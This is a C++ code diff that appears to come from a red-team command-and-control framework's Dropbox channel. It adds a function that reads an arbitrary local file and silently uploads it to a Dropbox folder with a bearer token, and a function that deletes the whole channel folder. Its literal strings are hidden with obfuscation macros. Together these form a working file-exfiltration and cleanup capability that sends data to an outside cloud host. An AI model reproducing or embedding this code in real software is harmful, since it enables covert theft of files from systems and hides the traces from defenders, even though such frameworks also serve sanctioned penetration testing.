@@ -7,6 +7,7 @@
 #include <random>
 #include <cctype>
 #include <algorithm>
+#include <fstream>
 
 using namespace FSecure::StringConversions;
 using namespace FSecure::WinHttp;
@@ -60,6 +61,38 @@ void FSecure::Dropbox::WriteMessageToFile(std::string const& direction, ByteView
 
 	SendHttpRequest(url, j.dump(), ContentType::ApplicationOctetstream, data);
 }
+
+void FSecure::Dropbox::UploadFile(std::string const& path)
+{
+	std::filesystem::path filepathForUpload = path;
+	auto readFile = std::ifstream(filepathForUpload, std::ios::binary);
+
+	ByteVector packet = ByteVector{ std::istreambuf_iterator<char>{readFile}, {} };
+	readFile.close();
+		
+	std::string ts = std::to_string(FSecure::Utils::TimeSinceEpoch());
+	std::string fn = filepathForUpload.filename().string();  // retain same file name and file extension for convenience.
+	std::string filename = OBF("upload-") + FSecure::Utils::GenerateRandomString(10) + OBF("-") + ts + OBF("-") + fn;
+
+	json j;
+	j[OBF("path")] = OBF("/") + this->m_Channel + OBF("/") + filename;
+	j[OBF("mode")] = OBF("add");
+	j[OBF("autorename")] = false;
+	j[OBF("mute")] = true;
+	j[OBF("strict_conflict")] = true;
+
+	std::string url = OBF_STR("https://content.dropboxapi.com/2/files/upload");
+	
+	SendHttpRequest(url, j.dump(), ContentType::ApplicationOctetstream, packet);
+}
+
+void FSecure::Dropbox::DeleteAllFiles()
+{
+	std::string folderPath = OBF("/") + this->m_Channel;
+	DeleteFile(folderPath);
+}
+
+
 
 std::map<std::string, std::string> FSecure::Dropbox::ListChannels()
 {
@@ -186,7 +219,7 @@ void FSecure::Dropbox::DeleteFile(std::string const& filename)
 	SendJsonRequest(url, j);
 }
 
-FSecure::ByteVector FSecure::Dropbox::SendHttpRequest(std::string const& host, std::string const& header, std::optional<WinHttp::ContentType> contentType, std::string const& data)
+FSecure::ByteVector FSecure::Dropbox::SendHttpRequest(std::string const& host, std::string const& header, std::optional<WinHttp::ContentType> contentType, ByteView data)
 {
 	while (true)
 	{
@@ -200,6 +233,35 @@ FSecure::ByteVector FSecure::Dropbox::SendHttpRequest(std::string const& host, s
 		}
 
 		if(!header.empty())
+			request.SetHeader(ToWideString("Dropbox-API-Arg"), ToWideString(header));
+
+		request.SetHeader(Header::Authorization, OBF(L"Bearer ") + ToWideString(this->m_Token));
+
+		auto resp = webClient.Request(request);
+
+		if (resp.GetStatusCode() == StatusCode::OK)
+			return resp.GetData();
+		else if (resp.GetStatusCode() == StatusCode::TooManyRequests)
+			std::this_thread::sleep_for(Utils::GenerateRandomValue(10s, 20s));
+		else
+			throw std::exception(OBF("[x] Non 200/429 HTTP Response\n"));
+	}
+}
+
+FSecure::ByteVector FSecure::Dropbox::SendHttpRequest(std::string const& host, std::string const& header, std::optional<WinHttp::ContentType> contentType, std::string const& data)
+{
+	while (true)
+	{
+		HttpClient webClient(ToWideString(host), m_ProxyConfig);
+		HttpRequest request; // default request is GET
+		request.m_Method = Method::POST;
+
+		if (contentType && !data.empty())
+		{
+			request.SetData(*contentType, { data.begin(), data.end() });
+		}
+
+		if (!header.empty())
 			request.SetHeader(ToWideString("Dropbox-API-Arg"), ToWideString(header));
 
 		request.SetHeader(Header::Authorization, OBF(L"Bearer ") + ToWideString(this->m_Token));
